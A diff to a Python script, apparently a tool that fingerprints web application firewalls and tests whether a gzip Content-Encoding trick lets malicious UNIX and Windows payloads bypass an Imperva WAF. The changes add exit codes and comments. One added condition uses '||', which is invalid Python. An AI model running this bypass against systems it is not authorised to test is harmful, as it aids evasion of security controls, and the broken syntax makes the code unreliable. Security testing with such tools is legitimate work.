@@ -31,6 +31,7 @@ You can script this tool and check the exit code in the caller:
 	2: There was an error connecting. Could be DNS error, timeout, etc.
 	3: No WAF was detected; malicious UNIX/Windows payloads weren't blocked.
 	4: A WAF was detected, but it wasn't Imperva.
+	5: The server responded to a test POST request with something other than HTTP 200.
 	128: There is an Imperva WAF, but it is not vulnerable to the gzip bypass.
 	129: The bypass was effective for the UNIX payload, but not the Windows one.
 	130: The bypass was effective for the Windows payload, but not the UNIX one.
@@ -73,6 +74,10 @@ class ImpervaBypass:
 			print('[!] Error connecting to %s' % self.URL)
 			exit(2)
 
+	# Returns one of three things:
+	# 'Type of WAF' if the WAF was identified
+	# 'Unknown'	if there's a WAF but we didn't identify it
+	# 'None'	if no WAF was found
 	def get_WAF_type(self):
 		if self.WAFType != '':
 			return self.WAFType
@@ -85,31 +90,31 @@ class ImpervaBypass:
 				if i == len(payloads) - 1:
 					self.WAFType = 'None'
 			except:
-				if 'x-cnection'				in r.headers: self.WAFType = 'BigIP'
-				if 'x-binarysec-nocache' 	in r.headers: self.WAFType = 'BinarySec'
-				if 'nncoection' 			in r.headers: self.WAFType = 'NetScaler'
-				if 'cneonction' 			in r.headers: self.WAFType = 'NetScaler'
+				if 'x-cnection'		 in r.headers: self.WAFType = 'BigIP'
+				if 'x-binarysec-nocache' in r.headers: self.WAFType = 'BinarySec'
+				if 'nncoection' 	 in r.headers: self.WAFType = 'NetScaler'
+				if 'cneonction' 	 in r.headers: self.WAFType = 'NetScaler'
 				
 				if 'Server' in r.headers:
-					if r.headers['Server'] == 'BigIP': 			  self.WAFType = 'BigIP'
-					if r.headers['Server'] == 'F5-TrafficShield': self.WAFType = 'F5 Traffic Shield'			
-					if 'WebKnight' 	in r.headers['Server']: 	  self.WAFType = 'WebKnight'
-					if 'BinarySEC' 	in r.headers['Server']: 	  self.WAFType = 'BinarySec'
-					if 'Profense' 	in r.headers['Server']: 	  self.WAFType = 'Profense'
-					if 'Cloudflare' in r.headers['Server']: 	  self.WAFType = 'Cloudflare'
-					if 'awselb/' 	in r.headers['Server']: 	  self.WAFType = 'AWS ELB'
+					if r.headers['Server'] == 'BigIP':		self.WAFType = 'BigIP'
+					if r.headers['Server'] == 'F5-TrafficShield':	self.WAFType = 'F5 Traffic Shield'			
+					if 'WebKnight' 	   in r.headers['Server']:	self.WAFType = 'WebKnight'
+					if 'BinarySEC' 	   in r.headers['Server']:	self.WAFType = 'BinarySec'
+					if 'Profense' 	   in r.headers['Server']:	self.WAFType = 'Profense'
+					if 'Cloudflare'	   in r.headers['Server']:	self.WAFType = 'Cloudflare'
+					if 'awselb/' 	   in r.headers['Server']:	self.WAFType = 'AWS ELB'
 
 				if 'Set-Cookie' in r.headers:
-					if 'barra_counter' in r.headers['Set-Cookie']: self.WAFType = 'Barracuda'
-					if 'sessioncookie' in r.headers['Set-Cookie']: self.WAFType = 'Denyall'
-					if 'NSC_' 		   in r.headers['Set-Cookie']: self.WAFType = 'NetScaler'
-					if 'AL_LB' 		   in r.headers['Set-Cookie']: self.WAFType = 'Airlock'
-					if 'AL_SESS' 	   in r.headers['Set-Cookie']: self.WAFType = 'Airlock'		
-					if 'ASINFO'  	   in r.headers['Set-Cookie']: self.WAFType = 'F5 Traffic Shield'
-					if 'st8id'   	   in r.headers['Set-Cookie']: self.WAFType = 'Teros / Citrix Application Firewall Enterprise'
-					if 'st8_wlf' 	   in r.headers['Set-Cookie']: self.WAFType = 'Teros / Citrix Application Firewall Enterprise'
-					if 'st8_wat' 	   in r.headers['Set-Cookie']: self.WAFType = 'Teros / Citrix Application Firewall Enterprise'
-					if 'PLBSID'  	   in r.headers['Set-Cookie']: self.WAFType = 'Profense'
+					if 'barra_counter' in r.headers['Set-Cookie']: 	self.WAFType = 'Barracuda'
+					if 'sessioncookie' in r.headers['Set-Cookie']: 	self.WAFType = 'Denyall'
+					if 'NSC_'	   in r.headers['Set-Cookie']: 	self.WAFType = 'NetScaler'
+					if 'AL_LB'	   in r.headers['Set-Cookie']: 	self.WAFType = 'Airlock'
+					if 'AL_SESS' 	   in r.headers['Set-Cookie']: 	self.WAFType = 'Airlock'		
+					if 'ASINFO'  	   in r.headers['Set-Cookie']: 	self.WAFType = 'F5 Traffic Shield'
+					if 'st8id'   	   in r.headers['Set-Cookie']: 	self.WAFType = 'Teros / Citrix Application Firewall Enterprise'
+					if 'st8_wlf' 	   in r.headers['Set-Cookie']: 	self.WAFType = 'Teros / Citrix Application Firewall Enterprise'
+					if 'st8_wat' 	   in r.headers['Set-Cookie']: 	self.WAFType = 'Teros / Citrix Application Firewall Enterprise'
+					if 'PLBSID'  	   in r.headers['Set-Cookie']: 	self.WAFType = 'Profense'
 
 				for k in knownWAFs:
 					if k in r.text:
@@ -125,6 +130,9 @@ class ImpervaBypass:
 		return self.WAFType
 
 	# Returns array (successFail, httpResponseStatusCode)
+	# success = false if there was an HTTP error (4xx, 5xx, etc) 
+	# success = true if there was a 2xx, 3xx, etc
+	# TODO: check for logic bugs handling redirects
 	def baseline_request(self):
 		try:
 			r = self.make_request(payloadBaseline)
@@ -133,6 +141,8 @@ class ImpervaBypass:
 		except requests.exceptions.HTTPError:
 			return (False, r.status_code)
 
+	# Returns array (successFail, httpResponseStatusCode)
+	# success = true if it's vulnerable; false otherwise
 	def is_vulnerable(self, payload):
 		try:
 			r = self.make_request(payload, headers={'Content-Encoding': 'gzip'})
@@ -159,9 +169,9 @@ imp = ImpervaBypass(sys.argv[1])
 # Verify we can make POST requests. No POST, no worky.
 print("[+] Can we make POST requests to %s?" % imp.URL)
 (success, status) = imp.baseline_request()
-if success == False:
+if success == False || status != 200:
 	print("[!] Can't POST to %s. HTTP response code: %d" % (imp.URL, status))
-	exit(2)
+	exit(5)
 
 # Get the WAF type and abort if it's not Imperva.
 print("[+] Checking for Imperva WAF...")
@@ -173,7 +183,7 @@ elif imp.get_WAF_type() != 'Imperva Incapsula':
 	exit(4)
 
 # Imperva will stall for a few seconds if we make a request
-# immediately after causing get_WAF_type.
+# immediately after calling get_WAF_type.
 sleep(0.5)
 
 # Run the two bypass attempts. 
